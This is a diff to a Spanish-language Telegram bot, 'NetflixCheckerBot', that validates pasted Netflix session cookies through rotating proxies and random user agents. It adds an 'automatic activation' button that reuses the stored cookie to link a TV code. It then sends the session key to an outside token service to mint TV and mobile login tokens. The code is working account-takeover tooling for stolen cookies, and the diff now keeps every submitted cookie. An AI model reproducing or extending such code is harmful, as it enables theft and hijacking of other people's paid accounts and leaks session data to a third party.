@@ -9,7 +9,7 @@ import urllib.parse
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 import logging
 from logging.handlers import RotatingFileHandler
 import random
@@ -24,7 +24,7 @@ if not BOT_TOKEN:
     raise ValueError("Falta la variable de entorno TELEGRAM_TOKEN en Render")
 
 DEVELOPER = "@Molina"
-VERSION = "3.2.0-AUTO-ACTIVATE"
+VERSION = "3.2.0-AUTO-ACTIVATE-FIXED"
 
 # 🔒 IDs de ADMINS
 ADMIN_IDS = [8917082484]
@@ -393,9 +393,9 @@ class NetflixCheckerBot:
         self.app = Application.builder().token(token).build()
         self.checker = NetflixChecker(threads=5, proxy_list=proxy_list)
         self.user_sessions = {}
-        
+
         # Nuevo estado para manejar la activación automática
-        self.user_states = {} 
+        self.user_states = {}
 
         self.app.add_handler(CommandHandler("start", self.start_command))
         self.app.add_handler(CommandHandler("help", self.help_command))
@@ -403,6 +403,10 @@ class NetflixCheckerBot:
         self.app.add_handler(CommandHandler("logs", self.logs_command))
         self.app.add_handler(CommandHandler("done", self.done_command))
         self.app.add_handler(CommandHandler("cancel", self.cancel_command))
+        
+        # AGREGADO: Controlador para los botones
+        self.app.add_handler(CallbackQueryHandler(self.button_handler))
+        
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
 
     def is_admin(self, user_id):
@@ -500,8 +504,20 @@ class NetflixCheckerBot:
     async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         self.user_sessions[user_id] = []
-        self.user_states[user_id] = None # Limpa estado de activação
+        self.user_states[user_id] = None # Limpa estado de activación
         await update.message.reply_text("❌ Cancelado.")
+
+    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        query = update.callback_query
+        user_id = query.from_user.id
+        
+        if query.data == "auto_activate":
+            # Cambiamos el estado del usuario a "esperando código"
+            self.user_states[user_id] = "waiting_for_code"
+            await query.answer() # Necesario para que deje de girar el botón
+            await query.message.edit_text("🔍 Envíame los 8 dígitos que ves en tu pantalla para conectar la TV...")
+        else:
+            await query.answer()
 
     async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user = update.effective_user
@@ -515,15 +531,15 @@ class NetflixCheckerBot:
             if len(code) == 8:
                 # Iniciamos la "Magia"
                 await update.message.reply_text("🔍 Conectando con Netflix para validar tus 8 dígitos...")
-                
+
                 # Ejecutamos la activación
                 result = await self.activate_tv_logic(user_id, code)
-                
+
                 if result:
                     await self.send_activation_success(update, result)
                 else:
                     await update.message.reply_text("❌ Error: Los códigos no coinciden o expiraron. Inténtalo de nuevo.")
-                
+
                 # Reseteamos el estado
                 self.user_states[user_id] = None
             else:
@@ -544,6 +560,11 @@ class NetflixCheckerBot:
         if any(k in message_text.lower() for k in ['netflixid','securenflixid','.netflix.com']):
             await update.message.reply_text("🔍 Verificando con alta precisión...")
             result = self.checker.process_cookie(message_text)
+            
+            # CORRECCIÓN: Guardamos la cookie en la sesión SIEMPRE, aunque sea hit o no
+            if user_id not in self.user_sessions: self.user_sessions[user_id] = []
+            self.user_sessions[user_id].append(message_text)
+            
             if result:
                 await self.send_hit_message(update, result)
             else:
@@ -566,9 +587,9 @@ class NetflixCheckerBot:
         try:
             # 1. Obtenemos la cookie original del usuario para reconstruir la sesión
             # Buscamos en sus sesiones anteriores o usamos la última cookie válida
-            last_cookie_text = self.user_sessions.get(user_id, [""])[-1] 
+            last_cookie_text = self.user_sessions.get(user_id, [""])[-1]
             cookies_dict = load_cookies(last_cookie_text)
-            
+
             if not cookies_dict:
                 return None
 
@@ -578,32 +599,32 @@ class NetflixCheckerBot:
                 headers={"User-Agent": random.choice(USER_AGENTS), "Content-Type": "application/json"},
                 json={"shortCode": code}
             )
-            
+
             if r.status_code == 200:
                 data = r.json()
                 session_key = data.get('sessionKey')
-                
+
                 if session_key:
                     # 3. Generamos los tokens usando esa session_key
                     # Usamos la misma lógica de generate_nftoken pero pasando la session key si fuera necesario
                     # En este caso, Netflix usa la session_key para autenticar la petición de token
-                    
+
                     # Construcción de headers con la cookie actual del usuario
                     headers = dict(_IOS_HEADERS_BASE)
                     headers["Cookie"] = f"NetflixId={cookies_dict.get('NetflixId', '')}"
-                    
+
                     # Ajustamos parámetros para usar la sesión activa
                     # (Nota: La API de NF-Token suele necesitar la sessionKey en el header o payload)
-                    
+
                     # Intentamos generar token con la API estándar pasando la session key
                     # O bien, hacemos la petición directa a la API de tokens
                     resp = requests.post(
                         "https://nf-token-api.vercel.app/tv",
                         json={"esn": _IOS_PARAMS.get("esn"), "sessionKey": session_key, "profileGuid": ""}
                     )
-                    
+
                     tv_token = resp.json().get('token')
-                    
+
                     # Hacemos lo mismo para móvil
                     resp_mobile = requests.post(
                         "https://nf-token-api.vercel.app/mobile",
@@ -617,7 +638,7 @@ class NetflixCheckerBot:
                         "status": "success"
                     }
             return None
-            
+
         except Exception as e:
             logger.error(f"Error en activación: {e}")
             return None
@@ -632,7 +653,7 @@ class NetflixCheckerBot:
             f"🔗 Aquí están tus enlaces permanentes:\n\n"
             f"👨‍💻 {DEVELOPER}"
         )
-        
+
         buttons = []
         row1 = []
         if result.get("tv_token"):
@@ -640,7 +661,7 @@ class NetflixCheckerBot:
         if result.get("mobile_token"):
             row1.append(InlineKeyboardButton("📱 Copiar Movil Token", switch_inline_query_current_chat=result["mobile_token"]))
         buttons.append(row1)
-        
+
         markup = InlineKeyboardMarkup(buttons)
         await update.message.reply_text(caption, parse_mode="HTML", reply_markup=markup)
 
@@ -685,7 +706,7 @@ class NetflixCheckerBot:
             row1.append(InlineKeyboardButton("📱 Phone", url=acc["login_phone"]))
         if row1: buttons.append(row1)
         buttons.append([InlineKeyboardButton("📺 TV", url=acc["login_tv"])])
-        
+
         # Botón Extra: Activación Automática
         buttons.append([InlineKeyboardButton("🚀 Activación Automática", callback_data="auto_activate")])
 
@@ -697,7 +718,7 @@ class NetflixCheckerBot:
         await update.message.reply_text(caption, parse_mode="HTML", reply_markup=markup)
 
     def run(self):
-        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO - PROXIES AUTOMÁTICOS - ANTI-BOT REAL")
+        logger.info(f"Bot iniciado - Dev: {DEVELOPER} - ANTISPAM ATIVO - ADMIN PROTEGIDO - PROXIES AUTOMÁTICOS - ANTI-BOT REAL - BOTONES FUNCIONALES")
         self.app.run_polling()
 
 if __name__ == "__main__":
